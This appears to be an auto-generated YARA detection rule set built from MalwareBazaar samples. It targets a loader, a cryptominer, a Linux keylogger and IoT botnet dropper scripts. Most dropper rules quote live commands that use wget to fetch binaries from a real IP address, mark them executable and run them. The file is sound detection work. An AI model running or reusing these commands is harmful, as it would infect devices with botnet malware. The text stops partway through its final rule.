/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-02
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_03967ab8ff06f4ffeb9d54de6966f8fd17dbdd3a219400ab323da9d0624c82e8 {
   meta:
      description = "evidences - file 03967ab8ff06f4ffeb9d54de6966f8fd17dbdd3a219400ab323da9d0624c82e8.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "03967ab8ff06f4ffeb9d54de6966f8fd17dbdd3a219400ab323da9d0624c82e8"
   strings:
      $s1 = "E:\\Dev\\project\\auth\\gethwid\\x64\\Release\\gethwid.pdb" fullword ascii
      $s2 = "VCRUNTIME140_1.dll" fullword ascii
      $s3 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii
      $s4 = ".data$rs" fullword ascii
      $s5 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
      $s6 = "__CxxFrameHandler4" fullword ascii
      $s7 = "  </trustInfo>" fullword ascii
      $s8 = ".rdata$voltmd" fullword ascii
      $s9 = "_seh_filter_exe" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "_set_app_type" fullword ascii /* Goodware String - occured 3 times */
      $s11 = "      </requestedPrivileges>" fullword ascii
      $s12 = "      <requestedPrivileges>" fullword ascii
      $s13 = ".CRT$XIAC" fullword ascii /* Goodware String - occured 3 times */
      $s14 = "_get_initial_narrow_environment" fullword ascii /* Goodware String - occured 3 times */
      $s15 = "_set_new_mode" fullword ascii /* Goodware String - occured 3 times */
      $s16 = " A^_^][" fullword ascii
      $s17 = "u/HcH<H" fullword ascii
      $s18 = " %Rich" fullword ascii
      $s19 = "2222222222222222" ascii /* Goodware String - occured 5 times */
      $s20 = "_register_thread_local_exe_atexit_callback" fullword ascii /* Goodware String - occured 5 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      8 of them
}

rule sig_115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3 {
   meta:
      description = "evidences - file 115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "115ad66a444732ea0982c1d5acb334cb4acd706ae195ca7218af2d1d48358ad3"
   strings:
      $x1 = "  --command=FILE, -x Execute GDB commands from FILE." fullword ascii
      $x2 = "<!-- The root element of a GDB target description is <target>.  -->" fullword ascii
      $s3 = "This target does not support attaching to a process" fullword ascii
      $s4 = "Execute the rest of the line as a shell command." fullword ascii
      $s5 = "Unable to dump core, use `ulimit -c unlimited' before executing GDB next time." fullword ascii
      $s6 = "-interpreter-exec: Usage: -interpreter-exec interp command" fullword ascii
      $s7 = "gdbarch_dump: process_record_signal = <%s>" fullword ascii
      $s8 = "Remote target failed to process qGetTIBAddr request" fullword ascii
      $s9 = "gdbarch_dump: process_record = <%s>" fullword ascii
      $s10 = "binary downloading supported by target" fullword ascii
      $s11 = "Debugging of process record target is %s." fullword ascii
      $s12 = "Remote target failed to process qGetTLSAddr request" fullword ascii
      $s13 = "target memory fault, section %s, range %s -- %s" fullword ascii
      $s14 = "\"dump verilog\" must be followed by a subcommand." fullword ascii
      $s15 = "<- %s->to_log_command (" fullword ascii
      $s16 = "Command to compile source code and inject it into the inferior." fullword ascii
      $s17 = "remotelogfile" fullword ascii /* base64 encoded string 'zj-zZ ~)^' */
      $s18 = "Usage: -target-detach [pid | thread-group]" fullword ascii
      $s19 = "Target does not support fast tracepoints, downloading %d as regular tracepoint" fullword ascii
      $s20 = "target_info->shadow_contents >= readbuf + len || readbuf >= (target_info->shadow_contents + target_info->shadow_len)" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule sig_49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb {
   meta:
      description = "evidences - file 49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb"
   strings:
      $s1 = "__kernel void find_shares(__global const uint64_t* hashes,uint64_t target,uint32_t start_nonce,__global uint32_t* shares)" fullword ascii
      $s2 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s3 = "hwloc/x86: Could not read dumped cpuid file %s, ignoring cpuiddump." fullword ascii
      $s4 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s5 = "void blake2b_512_process_single_block(ulong *h,const ulong* m,uint blockTemplateSize)" fullword ascii
      $s6 = "%PROGRAMFILES%\\NVIDIA Corporation\\NVSMI\\nvml.dll" fullword ascii
      $s7 = "blake2b_512_process_double_block_variable(hash,m,p,blockTemplateSize,64);" fullword ascii
      $s8 = "blake2b_512_process_big_block(hash,p,blockTemplateSize,64,start_nonce+global_index,nonce_offset);" fullword ascii
      $s9 = "blake2b_512_process_single_block(hash,m,blockTemplateSize);" fullword ascii
      $s10 = "get_payload_private_key" fullword ascii
      $s11 = "nicehash.com" fullword ascii
      $s12 = "get_payload_public_key" fullword ascii
      $s13 = "      --opencl-loader=PATH      path to OpenCL-ICD-Loader (OpenCL.dll or libOpenCL.so)" fullword ascii
      $s14 = "      --cuda-loader=PATH        path to CUDA plugin (xmrig-cuda.dll or libxmrig-cuda.so)" fullword ascii
      $s15 = "hwloc/x86: Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s16 = "* hwloc %s received invalid information from the operating system." fullword ascii
      $s17 = "__kernel void execute_vm(__global void* vm_states,__global void* rounding,__global void* scratchpads,__global const void* datase" ascii
      $s18 = "__kernel void blake2b_initial_hash(__global void *out,__global const void* blockTemplate,uint blockTemplateSize,uint start_nonce" ascii
      $s19 = "__kernel void execute_vm(__global void* vm_states,__global void* rounding,__global void* scratchpads,__global const void* datase" ascii
      $s20 = "__kernel void blake2b_initial_hash_big(__global void *out,__global const void* blockTemplate,uint blockTemplateSize,uint start_n" ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 28000KB and
      8 of them
}

rule a02eeb92a977c0749f93e6c7959159e68aa3a9e93c77f1fce81dc4b014e7c545 {
   meta:
      description = "evidences - file a02eeb92a977c0749f93e6c7959159e68aa3a9e93c77f1fce81dc4b014e7c545.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "a02eeb92a977c0749f93e6c7959159e68aa3a9e93c77f1fce81dc4b014e7c545"
   strings:
      $x1 = "pclose() pipe_exec_get_process failed" fullword ascii
      $x2 = "popen pipe_exec_get_process failed" fullword ascii
      $s3 = "keylogger" fullword ascii
      $s4 = "Get Process Cmd = %s" fullword ascii
      $s5 = "malloc() get_process_cmd" fullword ascii
      $s6 = "recv() get_process_cmd" fullword ascii
      $s7 = "pthread_create() get_process_thread" fullword ascii
      $s8 = "pthread_create() thread_log_keylogger" fullword ascii
      $s9 = "Len Process cmd = %zd" fullword ascii
      $s10 = "exec_get_proces_cmd()" fullword ascii
      $s11 = "exec_get_proces_cmd" fullword ascii
      $s12 = "/var/log/userlog.log" fullword ascii
      $s13 = "system() *.log" fullword ascii
      $s14 = "recv() len_process_cmd" fullword ascii
      $s15 = "execute_record_cmd()" fullword ascii
      $s16 = "kali_keylogger_init" fullword ascii
      $s17 = "daemonize_keylogger()" fullword ascii
      $s18 = "debian_keylogger_utils.c" fullword ascii
      $s19 = "fedora_keylogger_init" fullword ascii
      $s20 = "ubuntu16_keylogger_init" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983 {
   meta:
      description = "evidences - file c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983"
   strings:
      $s1 = "* K|V}\\" fullword ascii
      $s2 = "ywIDlLJs" fullword ascii
      $s3 = "3?\"%c\">*" fullword ascii /* hex encoded string '<' */
      $s4 = "0fx.aem" fullword ascii
      $s5 = "!i<J:\"" fullword ascii
      $s6 = "N Y:\\7}" fullword ascii
      $s7 = "qvjo6.JQCLV" fullword ascii
      $s8 = "XeX` W!rat=`" fullword ascii
      $s9 = "9FtPI87" fullword ascii
      $s10 = "'irCe;" fullword ascii
      $s11 = "tuSfJW9" fullword ascii
      $s12 = "- \"e{O" fullword ascii
      $s13 = "=!0%pg%" fullword ascii
      $s14 = "3,O+ `$" fullword ascii
      $s15 = "6/+ ?3" fullword ascii
      $s16 = ";O_* L4$" fullword ascii
      $s17 = "\\Ebob!" fullword ascii
      $s18 = "7%c /G" fullword ascii
      $s19 = "VN- AGBe" fullword ascii
      $s20 = "AvOAEN0" fullword ascii
   condition:
      uint16(0) == 0x54e8 and filesize < 13000KB and
      8 of them
}

rule e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820bff227 {
   meta:
      description = "evidences - file e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820bff227.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820bff227"
   strings:
      $s1 = "VVVVVUP" fullword ascii
      $s2 = "I]eWXAr>%" fullword ascii
      $s3 = "RnpcSr/" fullword ascii
      $s4 = "eRyH]jD" fullword ascii
      $s5 = ".ccSomYu" fullword ascii
      $s6 = "D$4PQQQ" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "\\(e\\O." fullword ascii
      $s8 = "\\a-vuxk" fullword ascii
      $s9 = "QnQJv7" fullword ascii
      $s10 = "L9[0t.M" fullword ascii
      $s11 = "t9HcC<" fullword ascii
      $s12 = " A_A^_^]" fullword ascii
      $s13 = "A88t.H" fullword ascii
      $s14 = "D$D+D$HA" fullword ascii
      $s15 = "u%ZUZHj" fullword ascii
      $s16 = "%;-S o" fullword ascii
      $s17 = "OI4^Br" fullword ascii
      $s18 = "D$XA9GP" fullword ascii
      $s19 = "L$lYPh" fullword ascii
      $s20 = "5@SwUD" fullword ascii
   condition:
      uint16(0) == 0xc0e8 and filesize < 200KB and
      8 of them
}

rule sig_0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73 {
   meta:
      description = "evidences - file 0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s2 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f funny; > .f;" ascii
      $s3 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s4 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s5 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
      $s6 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s7 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s8 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s9 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s10 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s11 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; # ;" ascii
      $s12 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s13 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; # ;" ascii
      $s14 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s15 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f funny; > .f; # ;" ascii
      $s16 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s17 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f funny; > .f; # ;" ascii
      $s18 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f funny; > ." ascii
      $s19 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f funny; >" ascii
      $s20 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f funny; > .f; #" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4ad9fea {
   meta:
      description = "evidences - file 4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4ad9fea.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4ad9fea"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s2 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s3 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s4 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s5 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s6 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s7 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f bigfish; > .f;" ascii
      $s8 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s9 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f bigfish;" ascii
      $s10 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f; #" ascii
      $s11 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f bigfish; > ." ascii
      $s12 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f bigfish; > .f; #" ascii
      $s13 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s14 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s15 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s16 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s17 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
      $s18 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f bigfish; > .f; #" ascii
      $s19 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f bigfish; > ." ascii
      $s20 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f bigfish; >" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_7bfb49dbe438622b5e6b8ccdd7dba17a35d2721a907827643aad9a627461b7d3 {
   meta:
      description = "evidences - file 7bfb49dbe438622b5e6b8ccdd7dba17a35d2721a907827643aad9a627461b7d3.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "7bfb49dbe438622b5e6b8ccdd7dba17a35d2721a907827643aad9a627461b7d3"
   strings:
      $s1 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s2 = "(wget http://217.28.130.78/vv/arc -O- || busybox wget http://217.28.130.78/vv/arc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s3 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s4 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s5 = "(wget http://217.28.130.78/vv/mips -O- || busybox wget http://217.28.130.78/vv/mips -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s6 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s7 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s8 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s9 = "(wget http://217.28.130.78/vv/powerpc -O- || busybox wget http://217.28.130.78/vv/powerpc -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s10 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s11 = "(wget http://217.28.130.78/vv/armv4l -O- || busybox wget http://217.28.130.78/vv/armv4l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s12 = "(wget http://217.28.130.78/vv/riscv32 -O- || busybox wget http://217.28.130.78/vv/riscv32 -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s13 = "(wget http://217.28.130.78/vv/sparc -O- || busybox wget http://217.28.130.78/vv/sparc -O-) > .f; chmod 777 .f; ./.f xvr; > .f; #" ascii
      $s14 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s15 = "(wget http://217.28.130.78/vv/mipsel -O- || busybox wget http://217.28.130.78/vv/mipsel -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s16 = "(wget http://217.28.130.78/vv/armv4eb -O- || busybox wget http://217.28.130.78/vv/armv4eb -O-) > .f; chmod 777 .f; ./.f xvr; > ." ascii
      $s17 = "(wget http://217.28.130.78/vv/armv5l -O- || busybox wget http://217.28.130.78/vv/armv5l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s18 = "(wget http://217.28.130.78/vv/sh4 -O- || busybox wget http://217.28.130.78/vv/sh4 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s19 = "(wget http://217.28.130.78/vv/armv6l -O- || busybox wget http://217.28.130.78/vv/armv6l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
      $s20 = "(wget http://217.28.130.78/vv/armv7l -O- || busybox wget http://217.28.130.78/vv/armv7l -O-) > .f; chmod 777 .f; ./.f xvr; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule sig_8824c9efb460160d0cad87d117efdf79a31c39a12cf6ec0018136aef9332a6cd {
   meta:
      description = "evidences - file 8824c9efb460160d0cad87d117efdf79a31c39a12cf6ec0018136aef9332a6cd.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "8824c9efb460160d0cad87d117efdf79a31c39a12cf6ec0018136aef9332a6cd"
   strings:
      $s1 = "(wget http://217.28.130.78/tt/mips -O- || busybox wget http://217.28.130.78/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s2 = "(wget http://217.28.130.78/tt/armv6l -O- || busybox wget http://217.28.130.78/tt/armv6l -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s3 = "(wget http://217.28.130.78/tt/powerpc -O- || busybox wget http://217.28.130.78/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s4 = "(wget http://217.28.130.78/tt/armv4l -O- || busybox wget http://217.28.130.78/tt/armv4l -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s5 = "(wget http://217.28.130.78/tt/riscv32 -O- || busybox wget http://217.28.130.78/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s6 = "(wget http://217.28.130.78/tt/mipsel -O- || busybox wget http://217.28.130.78/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s7 = "(wget http://217.28.130.78/tt/arc -O- || busybox wget http://217.28.130.78/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; # ;" ascii
      $s8 = "(wget http://217.28.130.78/tt/armv5l -O- || busybox wget http://217.28.130.78/tt/armv5l -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s9 = "(wget http://217.28.130.78/tt/sh4 -O- || busybox wget http://217.28.130.78/tt/sh4 -O-) > .f; chmod 777 .f; ./.f tscan; > .f; # ;" ascii
      $s10 = "(wget http://217.28.130.78/tt/armv4eb -O- || busybox wget http://217.28.130.78/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s11 = "(wget http://217.28.130.78/tt/sh4 -O- || busybox wget http://217.28.130.78/tt/sh4 -O-) > .f; chmod 777 .f; ./.f tscan; > .f; # ;" ascii
      $s12 = "(wget http://217.28.130.78/tt/mips -O- || busybox wget http://217.28.130.78/tt/mips -O-) > .f; chmod 777 .f; ./.f tscan; > .f; #" ascii
      $s13 = "(wget http://217.28.130.78/tt/armv7l -O- || busybox wget http://217.28.130.78/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s14 = "(wget http://217.28.130.78/tt/mipsel -O- || busybox wget http://217.28.130.78/tt/mipsel -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s15 = "(wget http://217.28.130.78/tt/sparc -O- || busybox wget http://217.28.130.78/tt/sparc -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
      $s16 = "(wget http://217.28.130.78/tt/armv4eb -O- || busybox wget http://217.28.130.78/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s17 = "(wget http://217.28.130.78/tt/arc -O- || busybox wget http://217.28.130.78/tt/arc -O-) > .f; chmod 777 .f; ./.f tscan; > .f; # ;" ascii
      $s18 = "(wget http://217.28.130.78/tt/armv7l -O- || busybox wget http://217.28.130.78/tt/armv7l -O-) > .f; chmod 777 .f; ./.f tscan; > ." ascii
      $s19 = "(wget http://217.28.130.78/tt/powerpc -O- || busybox wget http://217.28.130.78/tt/powerpc -O-) > .f; chmod 777 .f; ./.f tscan; >" ascii
      $s20 = "(wget http://217.28.130.78/tt/sparc -O- || busybox wget http://217.28.130.78/tt/sparc -O-) > .f; chmod 777 .f; ./.f tscan; > .f;" ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 7KB and
      8 of them
}

rule af9451401ca7b672e6a4189615a4f62dd700a77902f43699ceee5fb244e23569 {
   meta:
      description = "evidences - file af9451401ca7b672e6a4189615a4f62dd700a77902f43699ceee5fb244e23569.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "af9451401ca7b672e6a4189615a4f62dd700a77902f43699ceee5fb244e23569"
   strings:
      $s1 = "(wget http://217.28.130.78/tt/armv4l -O- || busybox wget http://217.28.130.78/tt/armv4l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s2 = "(wget http://217.28.130.78/tt/arc -O- || busybox wget http://217.28.130.78/tt/arc -O-) > .f; chmod 777 .f; ./.f sscan; > .f; # ;" ascii
      $s3 = "(wget http://217.28.130.78/tt/armv7l -O- || busybox wget http://217.28.130.78/tt/armv7l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s4 = "(wget http://217.28.130.78/tt/armv6l -O- || busybox wget http://217.28.130.78/tt/armv6l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s5 = "(wget http://217.28.130.78/tt/armv5l -O- || busybox wget http://217.28.130.78/tt/armv5l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s6 = "(wget http://217.28.130.78/tt/arc -O- || busybox wget http://217.28.130.78/tt/arc -O-) > .f; chmod 777 .f; ./.f sscan; > .f; # ;" ascii
      $s7 = "(wget http://217.28.130.78/tt/riscv32 -O- || busybox wget http://217.28.130.78/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s8 = "(wget http://217.28.130.78/tt/armv4eb -O- || busybox wget http://217.28.130.78/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s9 = "(wget http://217.28.130.78/tt/armv5l -O- || busybox wget http://217.28.130.78/tt/armv5l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s10 = "(wget http://217.28.130.78/tt/armv4eb -O- || busybox wget http://217.28.130.78/tt/armv4eb -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s11 = "(wget http://217.28.130.78/tt/armv6l -O- || busybox wget http://217.28.130.78/tt/armv6l -O-) > .f; chmod 777 .f; ./.f sscan; > ." ascii
      $s12 = "(wget http://217.28.130.78/tt/mips -O- || busybox wget http://217.28.130.78/tt/mips -O-) > .f; chmod 777 .f; ./.f sscan; > .f; #" ascii
      $s13 = "(wget http://217.28.130.78/tt/sh4 -O- || busybox wget http://217.28.130.78/tt/sh4 -O-) > .f; chmod 777 .f; ./.f sscan; > .f; # ;" ascii
      $s14 = "(wget http://217.28.130.78/tt/riscv32 -O- || busybox wget http://217.28.130.78/tt/riscv32 -O-) > .f; chmod 777 .f; ./.f sscan; >" ascii
      $s15 = "(wget http://217.28.130.78/tt/mips -O- || busybox wget http://217.28.130.78/tt/mips -O-) > .f; chmod 777 .f; ./.f sscan; > .f; #" ascii
      $s16 = "(wget http://217.28.130.78/tt/sparc -O- || busybox wget http://217.28.130.78/tt/sparc -O-) > .f; chmod 777 .f; ./.f sscan; > .f;" ascii
